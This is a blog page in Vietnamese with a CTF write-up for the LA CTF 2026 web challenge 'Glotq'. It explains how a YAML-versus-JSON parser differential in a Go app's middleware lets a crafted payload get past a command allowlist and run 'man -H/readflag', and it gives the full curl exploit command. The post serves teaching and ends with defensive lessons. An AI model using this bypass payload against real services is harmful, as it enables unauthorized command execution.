<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>LA CTF 2026 | H00d1eBl4ck</title><meta name="author" content="H00d1eBl4ck"><meta name="copyright" content="H00d1eBl4ck"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Web | GlotqGiới thiệuGlotq là một challenge CTF khai thác lỗ hổng trong ứng dụng web viếtbằng Go, tận dụng sự không nhất quán giữa lớp security middleware vàcác handler thực thi lệnh. Cụ thể, ta gửi p">
<meta property="og:type" content="article">
<meta property="og:title" content="LA CTF 2026">
<meta property="og:url" content="https://elliotbigfan.github.io/2026/02/16/2026/ctf/lactf/wu/index.html">
<meta property="og:site_name" content="H00d1eBl4ck">
<meta property="og:description" content="Web | GlotqGiới thiệuGlotq là một challenge CTF khai thác lỗ hổng trong ứng dụng web viếtbằng Go, tận dụng sự không nhất quán giữa lớp security middleware vàcác handler thực thi lệnh. Cụ thể, ta gửi p">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://elliotbigfan.github.io/img/ctf/lactf/poster.png">
<meta property="article:published_time" content="2026-02-16T06:33:16.000Z">
<meta property="article:modified_time" content="2026-02-16T06:39:54.838Z">
<meta property="article:author" content="H00d1eBl4ck">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="CTF">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://elliotbigfan.github.io/img/ctf/lactf/poster.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "LA CTF 2026",
  "url": "https://elliotbigfan.github.io/2026/02/16/2026/ctf/lactf/wu/",
  "image": "https://elliotbigfan.github.io/img/ctf/lactf/poster.png",
  "datePublished": "2026-02-16T06:33:16.000Z",
  "dateModified": "2026-02-16T06:39:54.838Z",
  "author": [
    {
      "@type": "Person",
      "name": "H00d1eBl4ck",
      "url": "https://elliotbigfan.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon_io/favicon.ico"><link rel="canonical" href="https://elliotbigfan.github.io/2026/02/16/2026/ctf/lactf/wu/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: true,
  islazyloadPlugin: false,
  isAnchor: true,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'LA CTF 2026',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/ctf/lactf/poster.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/favicon_io/favicon.ico" alt="Logo"><span class="site-name">H00d1eBl4ck</span></a><a class="nav-page-title" href="/"><span class="site-name">LA CTF 2026</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/bookmark/"><i class="fa-fw fas fa-bookmark"></i><span> Bookmark</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-person"></i><span> About Me</span></a></div><div class="menus_item"><a class="site-page" href="/certificate/"><i class="fa-fw fas fa-certificate"></i><span> Certificate</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">LA CTF 2026</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-16T06:33:16.000Z" title="Created 2026-02-16 13:33:16">2026-02-16</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-16T06:39:54.838Z" title="Updated 2026-02-16 13:39:54">2026-02-16</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/">CTF</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF/LA-CTF/">LA CTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">870</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>5mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Web-Glotq"><a href="#Web-Glotq" class="headerlink" title="Web | Glotq"></a>Web | Glotq</h1><h2 id="Gioi-thieu"><a href="#Gioi-thieu" class="headerlink" title="Giới thiệu"></a>Giới thiệu</h2><p>Glotq là một challenge CTF khai thác lỗ hổng trong ứng dụng web viết<br>bằng Go, tận dụng sự không nhất quán giữa lớp <strong>security middleware</strong> và<br>các handler thực thi lệnh. Cụ thể, ta gửi payload đến endpoint <code>/json</code><br>nhưng gán header <code>Content-Type: application/yaml</code>. Khi đó middleware sử<br>dụng YAML parser trong khi handler xử lý JSON parser. Kết quả là payload<br>được giải mã khác nhau ở hai bước, cho phép vượt qua cơ chế kiểm tra và<br>thực thi lệnh bất hợp lệ.</p>
<hr>
<h1 id="Co-che-ung-dung-va-middleware"><a href="#Co-che-ung-dung-va-middleware" class="headerlink" title="Cơ chế ứng dụng và middleware"></a>Cơ chế ứng dụng và middleware</h1><p>Xét mã nguồn middleware trong <code>middleware.go</code>: ứng dụng định nghĩa ba<br>endpoint <code>/json</code>, <code>/yaml</code>, <code>/xml</code> với lệnh được phép như sau:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> endpointCommands = <span class="keyword">map</span>[<span class="type">string</span>]<span class="keyword">map</span>[<span class="type">string</span>]<span class="type">bool</span>&#123;</span><br><span class="line">    <span class="string">&quot;/json&quot;</span>: &#123;<span class="string">&quot;jq&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;man&quot;</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">    <span class="string">&quot;/yaml&quot;</span>: &#123;<span class="string">&quot;yq&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;man&quot;</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">    <span class="string">&quot;/xml&quot;</span>:  &#123;<span class="string">&quot;xq&quot;</span>: <span class="literal">true</span>, <span class="string">&quot;man&quot;</span>: <span class="literal">true</span>&#125;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>→ Với <code>/json</code>, chỉ cho phép lệnh <code>&quot;jq&quot;</code> hoặc <code>&quot;man&quot;</code>.</p>
<p>Middleware đọc toàn bộ <code>r.Body</code>, sau đó dựa vào <code>Content-Type</code> để gọi<br>lần lượt <code>json.Unmarshal</code>, <code>yaml.Unmarshal</code> hoặc <code>xml.Unmarshal</code> vào các<br>struct tương ứng (<code>JSONPayload</code>, <code>YAMLPayload</code>, <code>XMLPayload</code>).</p>
<p>Ví dụ, nếu <code>Content-Type</code> chứa <code>&quot;application/yaml&quot;</code>, middleware dùng<br>YAML parser với struct:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> YAMLPayload <span class="keyword">struct</span> &#123;</span><br><span class="line">    Command <span class="type">string</span>   <span class="string">`yaml:&quot;command&quot;`</span></span><br><span class="line">    Args    []<span class="type">string</span> <span class="string">`yaml:&quot;args&quot;`</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Sau khi parse, middleware kiểm tra lệnh và tham số. Nếu<br><code>command == &quot;man&quot;</code>, middleware kiểm tra thêm rằng phải đúng 1 tham số và<br>tham số đó là <code>&quot;jq&quot;</code>, <code>&quot;yq&quot;</code> hoặc <code>&quot;xq&quot;</code>. Nếu bất kỳ điều kiện nào sai,<br>middleware trả về lỗi 403.</p>
<hr>
<h1 id="Handler-xu-ly-lenh"><a href="#Handler-xu-ly-lenh" class="headerlink" title="Handler xử lý lệnh"></a>Handler xử lý lệnh</h1><p>Trong <code>handlers.go</code>, handler đọc lại body và parse payload lần nữa.</p>
<p>Với <code>/json</code>, handler dùng:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">JSONHandler</span><span class="params">(w, r)</span></span> &#123;</span><br><span class="line">    body, _ := io.ReadAll(r.Body)</span><br><span class="line">    <span class="keyword">var</span> payload JSONPayload</span><br><span class="line">    json.Unmarshal(body, &amp;payload)</span><br><span class="line">    output, err := executeCommand(payload.Command, payload.Args, body)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Hàm <code>executeCommand</code>:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allowedCommands = &#123;<span class="string">&quot;jq&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;yq&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;xq&quot;</span>:<span class="literal">true</span>,<span class="string">&quot;man&quot;</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>

<p>Sau đó gọi:</p>
<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec.Command(command, args...)</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Khac-biet-giua-JSON-va-YAML-parser-trong-Go"><a href="#Khac-biet-giua-JSON-va-YAML-parser-trong-Go" class="headerlink" title="Khác biệt giữa JSON và YAML parser trong Go"></a>Khác biệt giữa JSON và YAML parser trong Go</h1><table>
<thead>
<tr>
<th>Parser</th>
<th>Case-sensitive</th>
<th>Ghi đè duplicate</th>
</tr>
</thead>
<tbody><tr>
<td>encoding&#x2F;json</td>
<td>❌ Không phân biệt hoa&#x2F;thường</td>
<td>Key xuất hiện sau cùng thắng</td>
</tr>
<tr>
<td>gopkg.in&#x2F;yaml.v3</td>
<td>✅ Phân biệt hoa&#x2F;thường</td>
<td>Key khác case có thể bị bỏ qua</td>
</tr>
</tbody></table>
<p>Ví dụ JSON:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;command&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span><span class="attr">&quot;Command&quot;</span><span class="punctuation">:</span><span class="string">&quot;b&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>→ Giá trị cuối cùng là <code>&quot;b&quot;</code>.</p>
<p>Ví dụ YAML:</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">command:</span> <span class="string">a</span></span><br><span class="line"><span class="attr">Command:</span> <span class="string">b</span></span><br></pre></td></tr></table></figure>

<p>→ Chỉ <code>&quot;a&quot;</code> được dùng.</p>
<hr>
<h1 id="Phan-tich-payload-tan-cong"><a href="#Phan-tich-payload-tan-cong" class="headerlink" title="Phân tích payload tấn công"></a>Phân tích payload tấn công</h1><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jq&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;-n&quot;</span><span class="punctuation">,</span> <span class="string">&quot;1&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;man&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;Args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;-H/readflag&quot;</span><span class="punctuation">,</span> <span class="string">&quot;jq&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Buoc-1-Middleware-YAML-parse"><a href="#Buoc-1-Middleware-YAML-parse" class="headerlink" title="Bước 1: Middleware (YAML parse)"></a>Bước 1: Middleware (YAML parse)</h2><ul>
<li><code>command = &quot;jq&quot;</code></li>
<li><code>args = [&quot;-n&quot;,&quot;1&quot;]</code></li>
<li><code>&quot;Command&quot;</code> và <code>&quot;Args&quot;</code> bị bỏ qua</li>
</ul>
<p>Middleware cho phép vì <code>&quot;jq&quot;</code> hợp lệ cho <code>/json</code>.</p>
<h2 id="Buoc-2-Handler-JSON-parse"><a href="#Buoc-2-Handler-JSON-parse" class="headerlink" title="Bước 2: Handler (JSON parse)"></a>Bước 2: Handler (JSON parse)</h2><p>JSON parser không phân biệt hoa&#x2F;thường:</p>
<ul>
<li><code>&quot;Command&quot;</code> ghi đè <code>&quot;command&quot;</code></li>
<li><code>&quot;Args&quot;</code> ghi đè <code>&quot;args&quot;</code></li>
</ul>
<p>Kết quả:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man -H/readflag jq</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Tai-sao-man-H-readflag-jq-doc-duoc-flag"><a href="#Tai-sao-man-H-readflag-jq-doc-duoc-flag" class="headerlink" title="Tại sao man -H/readflag jq đọc được flag?"></a>Tại sao <code>man -H/readflag jq</code> đọc được flag?</h1><p>Tùy chọn <code>-H</code> của <code>man</code> cho phép chỉ định HTML viewer. Khi truyền<br><code>/readflag</code>, hệ thống thực thi binary SUID <code>/readflag</code>, từ đó in nội<br>dung <code>/flag.txt</code>.</p>
<hr>
<h1 id="Script-khai-thac"><a href="#Script-khai-thac" class="headerlink" title="Script khai thác"></a>Script khai thác</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST -H <span class="string">&quot;Content-Type: application/yaml&quot;</span>      -d <span class="string">&#x27;&#123;&quot;command&quot;:&quot;jq&quot;,&quot;args&quot;:[&quot;-n&quot;,&quot;1&quot;],&quot;Command&quot;:&quot;man&quot;,&quot;Args&quot;:[&quot;-H/readflag&quot;,&quot;jq&quot;]&#125;&#x27;</span>      http://&lt;host&gt;/json</span><br></pre></td></tr></table></figure>

<p>Lần chạy đầu tiên sẽ trả về flag.</p>
<hr>
<h1 id="Ket-luan"><a href="#Ket-luan" class="headerlink" title="Kết luận"></a>Kết luận</h1><p>Đây là một ví dụ điển hình của <strong>parser differential vulnerability</strong>:</p>
<ul>
<li>Middleware dùng YAML (case-sensitive)</li>
<li>Handler dùng JSON (case-insensitive)</li>
<li>Payload lợi dụng sự khác biệt này để bypass kiểm tra</li>
</ul>
<p>Bài học rút ra:</p>
<ul>
<li>Không parse input nhiều lần bằng các parser khác nhau</li>
<li>Phải đồng nhất Content-Type và logic xử lý</li>
<li>Security check phải dùng cùng dữ liệu với dữ liệu thực thi</li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2026/02/16/2026/ctf/lactf/wu/">https://elliotbigfan.github.io/2026/02/16/2026/ctf/lactf/wu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/lactf/poster.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/02/16/2026/ctf/0xfun/wu/" title="Writeup: 0xFun CTF 2026"><img class="cover" src="/img/ctf/0xfun/poster.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Writeup: 0xFun CTF 2026</div></div><div class="info-2"><div class="info-item-1">Pwn | 67Phân tích challenge Checksec:  12RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   57 Symbols        No    0               2               chall_patched  –&gt; Gần như các cơ chế security đều đã được bật.  File chall: Hàm main:  123456789101112131415161718192021222324252627282930313233343536373839int _...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img class="cover" src="/img/ctf/lakectf/poster.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">Writeup: LakeCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích qua file server.js, file xử lý chính của challenge:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990app.get(&#x27;/api/balance&#x27;, (req, res) =&gt; &#123;    res.json(&#...</div></div></div></a><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a><a class="pagination-related" href="/2026/02/16/2026/ctf/0xfun/wu/" title="Writeup: 0xFun CTF 2026"><img class="cover" src="/img/ctf/0xfun/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-16</div><div class="info-item-2">Writeup: 0xFun CTF 2026</div></div><div class="info-2"><div class="info-item-1">Pwn | 67Phân tích challenge Checksec:  12RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILEFull RELRO      Canary found      NX enabled    PIE enabled     No RPATH   RW-RUNPATH   57 Symbols        No    0               2               chall_patched  –&gt; Gần như các cơ chế security đều đã được bật.  File chall: Hàm main:  123456789101112131415161718192021222324252627282930313233343536373839int _...</div></div></div></a><a class="pagination-related" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025"><img class="cover" src="/img/ctf/cybercon/poster_cybercon.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-25</div><div class="info-item-2">Writeup: cyberconDTU 2025</div></div><div class="info-2"><div class="info-item-1">Web | Safe upload file1. Phân tích mã nguồn và ý tưởng Đọc qua file .yar (validate file upload), ta có thể thấy các file khi đc upload lên server sẽ được file .yar này validate rất chặt và gần như không thể bypass để upload webshell được. Tuy nhiên, khi phân tích file upload.php ta có thể thấy một số đoạn code xử lý không hợp lý và dẫn đến upload file race condition.  1234567891011// move file vào thư mục $tmp_path(/var/www/html/tmp) if (!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp...</div></div></div></a><a class="pagination-related" href="/2026/01/14/2025/ctf/asisctf/wu/" title="Writeup: ASIS CTF 2025"><img class="cover" src="/img/ctf/asis/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-14</div><div class="info-item-2">Writeup: ASIS CTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Bookmarks Phân tích file app.py, ta có thể thấy bug CLRF injection nằm ở hàm dashboard và hoàn toàn có thể tận dụng bug này để gây ra XSS.  1234567891011121314151617181920@app.route(&quot;/dashboard&quot;, methods=[&#x27;GET&#x27;])def dashboard():    user_id = session.get(&quot;user_id&quot;)    if not user_id:        return &quot;User not logged&quot;, 400    username = None    with sqlite3.connect(DB_NAME) as conn:        cur = conn.execute(&quot;SELECT username FROM users WHERE id =...</div></div></div></a><a class="pagination-related" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img class="cover" src="/img/ctf/backdoor/logo.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-08</div><div class="info-item-2">Writeup: BackdoorCTF 2025</div></div><div class="info-2"><div class="info-item-1">Pwn | Challenge: Devil’s Convergence1. Phân tích chương trình: Sau khi reverse chương trình bằng IDA tool, thì ta sẽ biết được có 4 hàm quan trọng cần chú ý là:  initialize : khỏi tạo giá trị cho biến toàn cục contract_seal là địa chỉ libc của hàm system và thực thi các hàm setvbuf. control_manipulation: Encode XOR data người dùng truyền vào buf với nửa phần đầu giá trị của biến contract_seal. war_devils_prophecy:  Encode XOR data người dùng truyền vào buf với nửa phần sau giá trị của biến co...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">13</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">15</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Glotq"><span class="toc-number">1.</span> <span class="toc-text">Web | Glotq</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Gioi-thieu"><span class="toc-number">1.1.</span> <span class="toc-text">Giới 